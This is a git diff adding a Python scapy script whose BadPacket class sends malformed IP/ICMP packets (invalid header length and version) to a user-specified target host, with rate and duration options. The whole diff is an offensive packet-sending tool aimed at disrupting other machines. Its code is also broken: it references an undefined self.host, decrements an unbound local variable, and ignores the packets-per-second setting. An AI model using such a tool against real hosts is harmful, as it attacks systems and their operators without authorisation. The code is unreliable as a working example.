@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 """
  Copyright (c) 2017, Syslog777
  
@@ -27,3 +28,42 @@
  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 """
+from scapy.all import *
+
+"""
+BadPacket.send() sends one total packet by default
+"""
+
+
+class BadPacket:
+
+    def __init__(self, parser):
+        self.parser = parser
+        self.parser.add_argument('host', nargs='?',
+                                 help='Host to send bad packet(s) to')
+        self.parser.add_argument('-pps', '--packets-per-second',
+                                 help='Number of packets to send')
+        self.parser.add_argument('-ttr', '--time-to-run',
+                                 help='Total operation time')
+        self.parser.set_defaults(time_to_run=1)
+        self.parser.set_defaults(packets_per_second=1)
+        self.args = parser.parse_args()
+        self.time_to_run = self.args.time_to_run
+        self.packets_per_second = self.args.packets_per_second
+
+    def sendPayload(self):
+        send(IP(dst=self.host, ihl=2, version=3) / ICMP())
+
+    def send(self):
+        while self.time_to_run > 0:
+            if not self.args.host:
+                print("Host required!")
+                self.parser.print_help()
+                break
+            try:
+                while self.time_to_run > 0:
+                    self.sendPayload()
+                    time_to_run = time_to_run - 1
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                sys.exit(0)
